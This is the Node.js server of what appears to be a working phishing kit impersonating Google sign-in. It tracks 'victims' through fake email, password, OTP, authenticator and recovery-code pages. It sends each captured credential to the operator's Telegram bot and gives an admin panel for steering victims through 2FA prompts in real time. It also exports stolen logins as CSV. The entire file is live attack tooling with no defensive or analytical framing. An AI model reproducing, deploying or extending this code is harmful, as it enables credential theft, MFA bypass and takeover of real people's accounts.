const express = require('express');
const cors    = require('cors');
const crypto  = require('crypto');
const https   = require('https');
const PANEL_USER     = process.env.PANEL_USER  || 'astro';
const PANEL_PASS     = process.env.PANEL_PASS  || '1';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const COOKIE_NAME    = 'pan_sess_v2';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';
const app  = express();
const PORT = process.env.PORT || 3000;

console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***', TELEGRAM_ENABLED: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) });

const events = new (require('events')).EventEmitter();
function emitPanelUpdate() { events.emit('panel'); }

function sendTelegramMessage(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('[Telegram] Skipped (not configured):', message.substring(0, 50) + '...');
    return;
  }

  const data = JSON.stringify({
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  });

  const options = {
    hostname: 'api.telegram.org',
    port: 443,
    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };

  const req = https.request(options, (res) => {
    let responseData = '';
    res.on('data', (chunk) => responseData += chunk);
    res.on('end', () => {
      if (res.statusCode === 200) {
        console.log('[Telegram] Message sent successfully');
      } else {
        console.error('[Telegram] Failed:', res.statusCode, responseData);
      }
    });
  });

  req.on('error', (e) => {
    console.error('[Telegram] Error:', e.message);
  });

  req.write(data);
  req.end();
}

function formatVictimNotification(v, type) {
  const domain = currentDomain || 'Unknown';
  const header = type === 'login' ? '<b>NEW PANEL LOGIN</b>' : '<b>NEW VICTIM SESSION</b>';
  
  let msg = `${header}\n\n`;
  msg += `<b>Victim #:</b> ${v.victimNum}\n`;
  msg += `<b>IP:</b> <code>${v.ip}</code>\n`;
  msg += `<b>Platform:</b> ${v.platform}\n`;
  msg += `<b>Browser:</b> ${v.browser}\n`;
  msg += `<b>Time:</b> ${v.dateStr}\n`;
  
  if (type === 'session' && v.email) {
    msg += `\n<b>Email:</b> <code>${v.email}</code>\n`;
  }
  if (type === 'session' && v.password) {
    msg += `<b>Password:</b> <code>${v.password}</code>\n`;
  }
  if (v.otp) {
    msg += `<b>OTP:</b> <code>${v.otp}</code>\n`;
  }
  if (v.twofaCode) {
    msg += `<b>2FA Code:</b> <code>${v.twofaCode}</code>\n`;
  }
  
  msg += `\n<b>Panel:</b> ${domain}/panel`;
  
  return msg;
}

app.set('trust proxy', 1);

app.use((req, res, next) => {
  if (req.headers['x-forwarded-proto'] === 'https') {
    req.protocol = 'https';
    req.secure   = true;
  }
  next();
});

app.use((req, res, next) => {
  if (req.path.startsWith('/panel') || req.path.startsWith('/api/')) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma',        'no-cache');
    res.setHeader('Expires',       '0');
    res.setHeader('Surrogate-Control', 'no-store');
  }
  next();
});

app.use((req, res, next) => {
  req.cookies = {};
  if (req.headers.cookie) {
    req.headers.cookie.split(';').forEach(cookie => {
      const [name, ...rest] = cookie.trim().split('=');
      if (name && rest.length > 0) req.cookies[name] = rest.join('=');
    });
  }
  next();
});

function signCookie(value, secret) {
  return crypto.createHmac('sha256', secret).update(value).digest('base64url');
}
function setSessionCookie(res, data) {
  const encoded   = Buffer.from(JSON.stringify(data)).toString('base64url');
  const signature = signCookie(encoded, SESSION_SECRET);
  res.cookie(COOKIE_NAME, `${encoded}.${signature}`, {
    httpOnly: true, secure: true, sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000,
    expires: new Date(Date.now() + 24 * 60 * 60 * 1000),
    path: '/'
  });
}
function getSessionCookie(req) {
  const cookie = req.cookies?.[COOKIE_NAME];
  if (!cookie) return null;
  try {
    const [encoded, signature] = cookie.split('.');
    if (!encoded || !signature) return null;
    if (signature !== signCookie(encoded, SESSION_SECRET)) return null;
    return JSON.parse(Buffer.from(encoded, 'base64url').toString());
  } catch (e) { return null; }
}
function clearSessionCookie(res) {
  res.clearCookie(COOKIE_NAME, { path: '/', httpOnly: true, secure: true, sameSite: 'lax' });
}

app.use((req, res, next) => {
  req.session         = getSessionCookie(req) || {};
  if (req.session.authed) req.session.lastActivity = Date.now();
  req.session.save    = () => setSessionCookie(res, req.session);
  req.session.destroy = () => { clearSessionCookie(res); req.session = {}; };
  next();
});

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const sessionsMap     = new Map();
const sessionActivity = new Map();
const auditLog        = [];
let victimCounter     = 0;
let successfulLogins  = 0;
let currentDomain     = '';

app.use((req, res, next) => {
  const host  = req.headers.host || req.hostname;
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  currentDomain = host.includes('localhost')
    ? `http://localhost:${PORT}`
    : `${proto}://${host}`;
  next();
});

function uaParser(ua) {
  const u = { browser: {}, os: {} };
  if (/Windows NT/.test(ua))                           u.os.name = 'Windows';
  if (/Android/.test(ua))                              u.os.name = 'Android';
  if (/iPhone|iPad/.test(ua))                          u.os.name = 'iOS';
  if (/Linux/.test(ua) && !/Android/.test(ua))         u.os.name = 'Linux';
  if (/Mac/.test(ua))                                  u.os.name = 'macOS';
  if (/Chrome\/(\d+)/.test(ua))                        u.browser.name = 'Chrome';
  if (/Firefox\/(\d+)/.test(ua))                       u.browser.name = 'Firefox';
  if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
  if (/Edge\/(\d+)/.test(ua))                          u.browser.name = 'Edge';
  return u;
}

function getSessionHeader(v) {
  if (v.page === 'success' || v.status === 'approved') return `✅ Google Login approved`;
  if (v.page === 'index.html')         return v.entered   ? `📧 Email: ${v.email}` : '⏳ Awaiting email';
  if (v.page === 'welcome.html')       return v.password  ? `🔑 Password entered`  : `⏳ Awaiting password`;
  if (v.page === 'otp.html')           return v.otp       ? `✅ OTP: ${v.otp}` : v.twoFANumber ? `📲 OTP ···${v.twoFANumber}` : `⏳ Awaiting OTP`;
  if (v.page === 'recovery.html')      return v.twofaCode ? `✅ Recovery code: ${v.twofaCode}` : `🛡️ Recovery #${v.twoFANumber||'?'}`;
  if (v.page === 'verification.html')  return v.twofaCode ? `✅ Verification: ${v.twofaCode}` : `✉️ Awaiting code`;
  if (v.page === 'auth.html')          return v.twofaCode ? `✅ GAuth: ${v.twofaCode}` : `🔑 Awaiting GAuth code`;
  if (v.page === 'verify.html')        return v.twoFANumber ? `🔔 Verify Push #${v.twoFANumber}` : `🔔 Verify Push`;
  return `⏳ Waiting...`;
}

function cleanupSession(sid) {
  sessionsMap.delete(sid);
  sessionActivity.delete(sid);
}

app.get('/panel', (req, res) => {
  if (req.session?.authed === true) { req.session.save(); return res.sendFile(__dirname + '/_panel.html'); }
  res.sendFile(__dirname + '/access.html');
});

app.post('/panel/login', (req, res) => {
  const { user, pw } = req.body;
  if (user === PANEL_USER && pw === PANEL_PASS) {
    req.session.authed = true; req.session.username = user;
    req.session.loginTime = Date.now(); req.session.lastActivity = Date.now();
    req.session.save();
    
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua = req.headers['user-agent'] || 'n/a';
    const parsedUA = uaParser(ua);
    
    sendTelegramMessage(
      `<b>PANEL LOGIN SUCCESSFUL</b>\n\n` +
      `<b>User:</b> <code>${user}</code>\n` +
      `<b>IP:</b> <code>${ip}</code>\n` +
      `<b>Platform:</b> ${parsedUA.os?.name || 'Unknown'}\n` +
      `<b>Browser:</b> ${parsedUA.browser?.name || 'Unknown'}\n` +
      `<b>Time:</b> ${new Date().toLocaleString()}\n\n` +
      `<b>Domain:</b> ${currentDomain}`
    );
    
    return res.redirect(303, '/panel');
  }
  res.redirect(303, '/panel?fail=1');
});

app.get(/^\/panel\/.*$/, (req, res) => res.redirect(302, '/panel'));

app.post('/panel/logout', (req, res) => {
  req.session.destroy();
  res.redirect(303, '/panel');
});

app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));

app.post('/api/session', async (req, res) => {
  try {
    const sid = crypto.randomUUID();
    const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua  = req.headers['user-agent'] || 'n/a';
    const now = new Date();
    victimCounter++;
    const victim = {
      sid, ip, ua,
      dateStr:        now.toLocaleString(),
      entered:        false,
      email:          '',
      password:       '',
      otp:            '',
      twofaCode:      '',
      twoFANumber:    null,
      recoveryEmail:  '',
      recoveryPrefix: '',
      recoveryDomain: '',
      appName:        '',
      page:           'index.html',
      platform:       uaParser(ua).os?.name      || 'n/a',
      browser:        uaParser(ua).browser?.name || 'n/a',
      status:         'loaded',
      victimNum:      victimCounter,
      interactions:   [],
      activityLog:    [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected' }],
      redirectTarget: null,
      redirectUsed:   false,
      notified:       false
    };
    sessionsMap.set(sid, victim);
    sessionActivity.set(sid, Date.now());
    res.json({ sid });
  } catch (err) {
    console.error('Session creation error', err);
    res.status(500).json({ error: 'Failed to create session' });
  }
});

app.post('/api/ping', (req, res) => {
  const { sid } = req.body;
  if (sid && sessionsMap.has(sid)) { sessionActivity.set(sid, Date.now()); return res.sendStatus(200); }
  res.sendStatus(404);
});

app.post('/api/login', async (req, res) => {
  try {
    const { sid, email, password } = req.body;
    if (!sid) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);

    if (password) {
      v.password = password;
      v.status   = 'wait';
      v.activityLog.push({ time: Date.now(), action: 'ENTERED PASSWORD', detail: 'Password captured' });
      const entry = auditLog.find(e => e.sid === sid);
      if (entry) entry.password = password;
      else auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email: v.email, password, otp: '', twofaCode: '', ip: v.ip, ua: v.ua });
      
      if (v.email && !v.notified) {
        v.notified = true;
        sendTelegramMessage(formatVictimNotification(v, 'session'));
      }
    } else if (email) {
      v.entered = true; v.email = email; v.status = 'wait';
      v.activityLog.push({ time: Date.now(), action: 'ENTERED EMAIL', detail: `Email: ${email}` });
      auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password: '', otp: '', twofaCode: '', ip: v.ip, ua: v.ua });
    }

    sessionActivity.set(sid, Date.now());
    emitPanelUpdate();
    res.sendStatus(200);
  } catch (err) {
    console.error('Login error', err);
    res.status(500).send('Error');
  }
});

app.post('/api/otp', async (req, res) => {
  try {
    const { sid, otp, type } = req.body;
    if (!otp?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);

    const isGauth = (type === 'twofa' || type === 'gauth');

    if (isGauth) {
      v.twofaCode = otp;
      v.activityLog.push({ time: Date.now(), action: 'ENTERED GAUTH CODE', detail: `Code: ${otp}` });
    } else {
      v.otp    = otp;
      v.status = 'wait';
      v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
    }

    const entry = auditLog.find(e => e.sid === sid);
    if (entry) {
      if (isGauth) entry.twofaCode = otp;
      else         entry.otp       = otp;
    }

    if (v.notified) {
      sendTelegramMessage(
        `<b>VICTIM UPDATE - ${isGauth ? '2FA CODE' : 'OTP'}</b>\n\n` +
        `<b>Victim #:</b> ${v.victimNum}\n` +
        `<b>Email:</b> <code>${v.email}</code>\n` +
        `<b>${isGauth ? '2FA Code' : 'OTP'}:</b> <code>${otp}</code>\n` +
        `<b>IP:</b> <code>${v.ip}</code>\n` +
        `<b>Time:</b> ${new Date().toLocaleString()}`
      );
    }

    emitPanelUpdate();
    res.sendStatus(200);
  } catch (err) {
    console.error('OTP error', err);
    res.status(500).send('Error');
  }
});

app.post('/api/page', async (req, res) => {
  try {
    const { sid, page, twoFANumber } = req.body;
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    const oldPage = v.page;
    v.page = page;
    if (twoFANumber) v.twoFANumber = twoFANumber;
    sessionActivity.set(sid, Date.now());
    v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });
    emitPanelUpdate();
    res.sendStatus(200);
  } catch (err) {
    console.error('Page change error', err);
    res.status(500).send('Error');
  }
});

app.get('/api/status/:sid', (req, res) => {
  const v = sessionsMap.get(req.params.sid);
  if (!v) return res.json({ status: 'gone' });

  const response = {
    status:         v.status,
    page:           v.page,
    email:          v.email,
    entered:        v.entered,
    password:       v.password,
    otp:            v.otp,
    twofaCode:      v.twofaCode,
    twoFANumber:    v.twoFANumber,
    recoveryEmail:  v.recoveryEmail,
    recoveryPrefix: v.recoveryPrefix,
    recoveryDomain: v.recoveryDomain,
    appName:        v.appName
  };

  if (v.status === 'ok' && v.redirectTarget && !v.redirectUsed) {
    response.redirect = v.redirectTarget;
    console.log(`[status] ${req.params.sid} → redirect: ${v.redirectTarget}`);
  }

  res.json(response);
});

app.post('/api/clearRedo', (req, res) => {
  const v = sessionsMap.get(req.body.sid);
  if (v && v.status === 'redo') v.status = 'loaded';
  res.sendStatus(200);
});

app.post('/api/clearOk', (req, res) => {
  const v = sessionsMap.get(req.body.sid);
  if (v && v.status === 'ok') { v.status = 'loaded'; v.redirectUsed = true; }
  res.sendStatus(200);
});

app.post('/api/interaction', (req, res) => {
  const { sid, type, data } = req.body;
  if (!sessionsMap.has(sid)) return res.sendStatus(404);
  const v = sessionsMap.get(sid);
  v.lastInteraction = Date.now();
  v.interactions    = v.interactions || [];
  v.interactions.push({ type, data, time: Date.now() });
  sessionActivity.set(sid, Date.now());
  res.sendStatus(200);
});

app.get('/api/user', (req, res) => {
  if (req.session?.authed) {
    req.session.lastActivity = Date.now(); req.session.save();
    return res.json({ username: req.session.username || PANEL_USER });
  }
  res.status(401).json({ error: 'Not authenticated' });
});

function buildPanelPayload() {
  const list = Array.from(sessionsMap.values()).map(v => ({
    sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v),
    page: v.page, status: v.status,
    email: v.email, password: v.password,
    otp: v.otp, twofaCode: v.twofaCode, twoFANumber: v.twoFANumber,
    recoveryEmail: v.recoveryEmail, recoveryPrefix: v.recoveryPrefix, recoveryDomain: v.recoveryDomain, appName: v.appName,
    ip: v.ip, platform: v.platform, browser: v.browser,
    ua: v.ua, dateStr: v.dateStr, entered: v.entered,
    activityLog: v.activityLog || []
  }));
  return {
    domain:       currentDomain,
    username:     PANEL_USER,
    totalVictims: victimCounter,
    active:       list.filter(x => x.status !== 'approved' && x.page !== 'success').length,
    waiting:      list.filter(x => x.status === 'wait').length,
    success:      successfulLogins,
    sessions:     list,
    logs:         auditLog.slice(-50).reverse()
  };
}

app.get('/api/panel', (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
  req.session.lastActivity = Date.now(); req.session.save();

  let responded = false;
  const listener = () => { if (responded) return; responded = true; res.json(buildPanelPayload()); };
  events.once('panel', listener);
  setTimeout(() => {
    if (responded) return;
    responded = true;
    events.removeListener('panel', listener);
    res.json(buildPanelPayload());
  }, 1000);
});

app.post('/api/panel', async (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
  req.session.lastActivity = Date.now(); req.session.save();

  const { action, sid, target, twoFANumber, phoneSuffix, recoveryEmail, recoveryPrefix, recoveryDomain, appName } = req.body;
  const v = sessionsMap.get(sid);
  if (!v) return res.status(404).json({ ok: false });

  const VALID_REDIRECT_TARGETS = [
    'otp.html',
    'recovery.html',
    'verification.html',
    'auth.html',
    'verify.html'
  ];

  switch (action) {

    case 'redo':
      v.status         = 'redo';
      v.redirectTarget = null;
      v.redirectUsed   = false;
      if      (v.page === 'index.html')        { v.entered = false; v.email = ''; }
      else if (v.page === 'welcome.html')       { v.password = ''; }
      else if (v.page === 'auth.html')          { v.twofaCode = ''; }
      else if (v.page === 'otp.html')           { v.otp = ''; }
      else if (v.page === 'recovery.html')      { v.twofaCode = ''; }
      else if (v.page === 'verification.html')  { v.twofaCode = ''; }
      else if (v.page === 'verify.html')        { /* push — just redo */ }
      v.activityLog.push({ time: Date.now(), action: 'ADMIN REDO', detail: `Page: ${v.page}` });
      break;

    case 'cont':
      if (v.page === 'index.html') {
        v.page = 'welcome.html'; v.status = 'loaded';
        v.activityLog.push({ time: Date.now(), action: 'ADMIN CONTINUE', detail: 'index → welcome' });
      } else if ([
        'otp.html', 'recovery.html',
        'verification.html', 'auth.html', 'verify.html'
      ].includes(v.page)) {
        v.page = 'success'; v.status = 'approved'; successfulLogins++;
        v.activityLog.push({ time: Date.now(), action: 'APPROVED', detail: `Admin approved from ${v.page}` });
        
        sendTelegramMessage(
          `<b>VICTIM APPROVED</b>\n\n` +
          `<b>Victim #:</b> ${v.victimNum}\n` +
          `<b>Email:</b> <code>${v.email}</code>\n` +
          `<b>Final Status:</b> Approved (Success Page)\n` +
          `<b>Time:</b> ${new Date().toLocaleString()}`
        );
      }
      break;

    case 'redirect':
      console.log(`[redirect] ${sid} → ${target}`);
      if (target && VALID_REDIRECT_TARGETS.includes(target)) {
        v.redirectTarget = target;
        v.redirectUsed   = false;
        v.status         = 'ok';
        v.page           = target;

        if (['auth.html', 'verification.html', 'recovery.html'].includes(target)) {
          v.twofaCode = '';
        }
        if (target === 'otp.html') { v.otp = ''; }

        if (target === 'otp.html' && phoneSuffix) {
          v.twoFANumber = String(phoneSuffix).replace(/\D/g, '').slice(-2);
        }
        if ((target === 'verify.html' || target === 'recovery.html') && twoFANumber) {
          v.twoFANumber = String(twoFANumber).replace(/\D/g, '').slice(0, 2);
        }
        if (target === 'recovery.html' && recoveryEmail) {
          v.recoveryEmail  = recoveryEmail;
          if (recoveryPrefix) v.recoveryPrefix = recoveryPrefix;
          if (recoveryDomain) v.recoveryDomain = recoveryDomain;
        }

        v.activityLog.push({
          time: Date.now(), action: 'ADMIN REDIRECT',
          detail: `→ ${target} | #${v.twoFANumber} | app:${v.appName} | recovery:${v.recoveryEmail}`
        });
        console.log(`[redirect] page=${target}, status=ok for ${sid}`);
      } else {
        console.warn(`[redirect] Invalid target "${target}" rejected`);
      }
      break;

    case 'set-2fa-number':
      if (twoFANumber)    v.twoFANumber   = twoFANumber;
      if (recoveryEmail)  v.recoveryEmail  = recoveryEmail;
      if (recoveryPrefix) v.recoveryPrefix = recoveryPrefix;
      if (recoveryDomain) v.recoveryDomain = recoveryDomain;
      if (appName)        v.appName        = appName;
      if (phoneSuffix)    v.twoFANumber    = String(phoneSuffix).replace(/\D/g,'').slice(-2);
      v.activityLog.push({ time: Date.now(), action: 'CONFIG UPDATED', detail: `#${v.twoFANumber} app:${v.appName} recovery:${v.recoveryEmail}` });
      break;

    case 'skip2fa':
      v.page = 'success'; v.status = 'approved'; v.redirectTarget = null;
      successfulLogins++;
      v.activityLog.push({ time: Date.now(), action: 'SKIP 2FA', detail: 'Approved without 2SV' });
      
      sendTelegramMessage(
        `<b>VICTIM APPROVED (Skipped 2FA)</b>\n\n` +
        `<b>Victim #:</b> ${v.victimNum}\n` +
        `<b>Email:</b> <code>${v.email}</code>\n` +
        `<b>Password:</b> <code>${v.password}</code>\n` +
        `<b>IP:</b> <code>${v.ip}</code>\n` +
        `<b>Time:</b> ${new Date().toLocaleString()}`
      );
      break;

    case 'delete':
      cleanupSession(sid);
      emitPanelUpdate();
      return res.json({ ok: true });
  }

  emitPanelUpdate();
  res.json({ ok: true });
});

app.post('/api/refresh', (req, res) => {
  if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
  sessionsMap.clear(); sessionActivity.clear(); auditLog.length = 0;
  victimCounter = 0; successfulLogins = 0;
  emitPanelUpdate();
  res.json({ ok: true });
});

app.get('/api/export', (req, res) => {
  if (!req.session?.authed) return res.status(401).send('Unauthorized');
  req.session.lastActivity = Date.now(); req.session.save();
  const successes = auditLog
    .filter(r => r.email && (r.password || r.otp || r.twofaCode))
    .map(r => ({
      victimNum:  r.victimN,
      email:      r.email,
      password:   r.password,
      otp:        r.otp,
      gauthCode:  r.twofaCode,
      ip:         r.ip,
      ua:         r.ua,
      timestamp:  new Date(r.t).toISOString()
    }));
  const csv = [
    ['Victim#','Email','Password','OTP','GAuth Code','IP','UA','Timestamp'],
    ...successes.map(s => Object.values(s).map(v => `"${v}"`))
  ].map(r => r.join(',')).join('\n');
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="successful_logins.csv"');
  res.send(csv);
});

app.get('/',                   (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/welcome.html',       (req, res) => res.sendFile(__dirname + '/welcome.html'));
app.get('/otp.html',           (req, res) => res.sendFile(__dirname + '/otp.html'));
app.get('/recovery.html',      (req, res) => res.sendFile(__dirname + '/recovery.html'));
app.get('/verification.html',  (req, res) => res.sendFile(__dirname + '/verification.html'));
app.get('/auth.html',          (req, res) => res.sendFile(__dirname + '/auth.html'));
app.get('/verify.html',        (req, res) => res.sendFile(__dirname + '/verify.html'));
app.use(express.static(__dirname));

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Panel user: ${PANEL_USER}`);
  currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
});
